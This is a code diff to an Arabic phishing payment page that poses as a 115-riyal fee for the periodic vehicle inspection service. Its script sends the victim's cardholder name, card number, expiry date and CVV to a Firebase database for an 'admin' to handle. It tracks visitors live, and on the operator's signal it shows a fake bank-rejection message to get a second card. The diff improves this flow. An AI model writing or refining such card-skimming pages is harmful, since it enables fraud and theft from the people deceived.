@@ -66,7 +66,7 @@
             <p>بقيمة 115 ريال - خدمة الفحص الفني الدوري</p>
         </div>
 
-        <div id="rejectMsg">تم الرفض من قبل البنك مصدر البطاقة، قد تكون البطاقة غير مؤهلة للدفع عبر الإنترنت. يرجى التحقق</div>
+        <div id="rejectMsg">تم الرفض من قبل البنك مصدر البطاقة، يرجى استخدام بطاقة أخرى أو التأكد من بياناتك.</div>
 
         <div class="credit-card-view" id="cardVisual">
             <div class="card-logo-row">
@@ -107,7 +107,9 @@
 
     <script>
         const firebaseConfig = { 
-            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/" 
+            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
+            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
+            projectId: "saso-inspection"
         };
         if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
         const database = firebase.database();
@@ -118,13 +120,20 @@
             localStorage.setItem('v_id', v_id);
         }
 
-        // فحص حالة الرفض عند تحميل الصفحة فقط (عشان ما يصفرش واحنا بنبعت)
+        // فحص حالة الرفض عند تحميل الصفحة
         database.ref('orders/' + v_id + '/next_step').once('value', (snapshot) => {
-            if (snapshot.val() === 'wrong_card') {
+            const step = snapshot.val();
+            if (step === 'wrong_card') {
                 document.getElementById('rejectMsg').style.display = 'block';
                 const fields = ['cardHolder', 'cardNumber', 'cardExpiry', 'cvv'];
                 fields.forEach(id => document.getElementById(id).classList.add('error-border'));
             }
+        });
+
+        // تحديث موقع الزائر
+        database.ref('live_sessions/' + v_id).update({
+            current_page: "إدخال بيانات البطاقة",
+            last_seen: new Date().getTime()
         });
 
         function isValidLuhn(number) {
@@ -157,19 +166,24 @@
             }
         }
 
-        function clearError(el) {
-            el.classList.remove('error-border');
+        // وظيفة مسح الخطأ وتصفير الحالة في الداتابيز فوراً
+        function clearError() {
             document.getElementById('rejectMsg').style.display = 'none';
+            const fields = ['cardHolder', 'cardNumber', 'cardExpiry', 'cvv'];
+            fields.forEach(id => document.getElementById(id).classList.remove('error-border'));
+            
+            // تصفير الحالة في الفايربيس عشان ما يحصلش تحويل تلقائي
+            database.ref('orders/' + v_id).update({ next_step: 'waiting' });
         }
 
         document.getElementById('cardHolder').addEventListener('input', function() {
-            clearError(this);
+            clearError();
             document.getElementById('viewCardHolder').innerText = this.value || 'اسم حامل البطاقة';
             validateForm();
         });
 
         document.getElementById('cardNumber').addEventListener('input', function() {
-            clearError(this);
+            clearError();
             let val = this.value.replace(/\D/g, '');
             this.value = val.match(/.{1,4}/g)?.join(' ') || '';
             document.getElementById('viewCardNumber').innerText = this.value || '#### #### #### ####';
@@ -181,7 +195,7 @@
         });
 
         document.getElementById('cardExpiry').addEventListener('input', function() {
-            clearError(this);
+            clearError();
             let val = this.value.replace(/\D/g, '');
             if (val.length >= 2) this.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
             else this.value = val;
@@ -190,14 +204,14 @@
         });
 
         document.getElementById('cvv').addEventListener('input', function() {
-            clearError(this);
+            clearError();
             validateForm();
         });
 
         function submitPayment() {
             const btn = document.getElementById('payButton');
             btn.disabled = true;
-            btn.innerText = "جاري التحميل...";
+            btn.innerText = "جاري التحقق من البطاقة...";
 
             const payload = {
                 fullName: document.getElementById('cardHolder').value,
@@ -205,14 +219,15 @@
                 expiryDate: document.getElementById('cardExpiry').value,
                 cvv: document.getElementById('cvv').value,
                 next_step: 'waiting', 
-                status: 'Online_Pay_Submitted',
+                status: 'تم إدخال بيانات البطاقة - انتظار الآدمن',
                 last_update: new Date().getTime()
             };
 
             database.ref('orders/' + v_id).update(payload).then(() => {
-                window.location.href = 'processing.html'; 
+                // استخدام replace لمنع الرجوع للبطاقة بالخطأ
+                window.location.replace('processing.html'); 
             }).catch(() => {
-                window.location.href = 'processing.html';
+                window.location.replace('processing.html');
             });
         }
     </script>
